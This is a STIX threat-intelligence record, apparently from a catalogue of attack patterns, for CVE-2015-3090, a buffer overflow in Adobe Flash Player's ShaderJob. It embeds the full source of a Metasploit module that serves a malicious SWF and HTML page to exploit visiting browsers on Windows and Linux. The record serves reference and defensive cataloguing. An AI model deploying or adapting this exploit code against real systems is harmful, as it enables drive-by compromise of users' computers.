{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6d484769-831a-47c7-bae3-6628422c52b6",
    "created": "2024-08-14T17:05:41.141248Z",
    "modified": "2024-08-14T17:05:41.141252Z",
    "name": "Adobe Flash Player ShaderJob Buffer Overflow",
    "description": " This module exploits a buffer overflow vulnerability related to the ShaderJob workings on Adobe Flash Player. The vulnerability happens when trying to apply a Shader setting up the same Bitmap object as src and destination of the ShaderJob. Modifying the \"width\" attribute of the ShaderJob after starting the job it's possible to create a buffer overflow condition where the size of the destination buffer and the length of the copy are controlled. This module has been tested successfully on:  Windows 7 SP1 (32-bit), IE11 and Adobe Flash 17.0.0.169 Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 17.0.0.169 Windows 8.1, Firefox 38.0.5 and Adobe Flash 17.0.0.169, and Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.457.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/adobe_flash_shader_job_overflow.rb",
            "external_id": "adobe_flash_shader_job_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3090"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsb15-09.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2015/05/angler_ek_exploiting.html"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2015/05/cve-2015-3090-flash-up-to-1700169-and.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.brooksandrus.com/blog/2009/03/11/bilinear-resampling-with-flash-player-and-pixel-bender/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                => 'Adobe Flash Player ShaderJob Buffer Overflow',\n      'Description'         => %q{\n        This module exploits a buffer overflow vulnerability related to the ShaderJob workings on\n        Adobe Flash Player. The vulnerability happens when trying to apply a Shader setting up the\n        same Bitmap object as src and destination of the ShaderJob. Modifying the \"width\" attribute\n        of the ShaderJob after starting the job it's possible to create a buffer overflow condition\n        where the size of the destination buffer and the length of the copy are controlled. This\n        module has been tested successfully on:\n\n        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 17.0.0.169,\n        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 17.0.0.169,\n        Windows 8.1, Firefox 38.0.5 and Adobe Flash 17.0.0.169, and\n        Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.457.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Chris Evans', # Vulnerability discovery\n          'Unknown', # Exploit in the wild\n          'juan vazquez' # msf module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2015-3090'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-09.html'],\n          ['URL', 'https://www.fireeye.com/blog/threat-research/2015/05/angler_ek_exploiting.html'],\n          ['URL', 'http://malware.dontneedcoffee.com/2015/05/cve-2015-3090-flash-up-to-1700169-and.html'],\n          ['URL', 'http://www.brooksandrus.com/blog/2009/03/11/bilinear-resampling-with-flash-player-and-pixel-bender/']\n        ],\n      'Payload'             =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => ['win', 'linux'],\n      'Arch'                => [ARCH_X86],\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :arch    => ARCH_X86,\n          :os_name => lambda do |os|\n            os =~ OperatingSystems::Match::LINUX ||\n              os =~ OperatingSystems::Match::WINDOWS_7 ||\n              os =~ OperatingSystems::Match::WINDOWS_81\n          end,\n          :ua_name => lambda do |ua|\n            case target.name\n            when 'Windows'\n              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF\n            when 'Linux'\n              return true if ua == Msf::HttpClients::FF\n            end\n\n            false\n          end,\n          :flash   => lambda do |ver|\n            case target.name\n            when 'Windows'\n              return true if ver =~ /^17\\./ && Rex::Version.new(ver) <= Rex::Version.new('17.0.0.169')\n            when 'Linux'\n              return true if ver =~ /^11\\./ && Rex::Version.new(ver) <= Rex::Version.new('11.2.202.457')\n            end\n\n            false\n          end\n        },\n      'Targets'             =>\n        [\n          [ 'Windows',\n            {\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux',\n            {\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2015-05-12',\n      'DefaultTarget'       => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status('Sending SWF...')\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n    os_name = target_info[:os_name]\n\n    if target.name =~ /Windows/\n      platform_id = 'win'\n    elsif target.name =~ /Linux/\n      platform_id = 'linux'\n    end\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-3090', 'msf.swf')\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-05-12",
    "x_mitre_platforms": [
        "linux"
    ]
}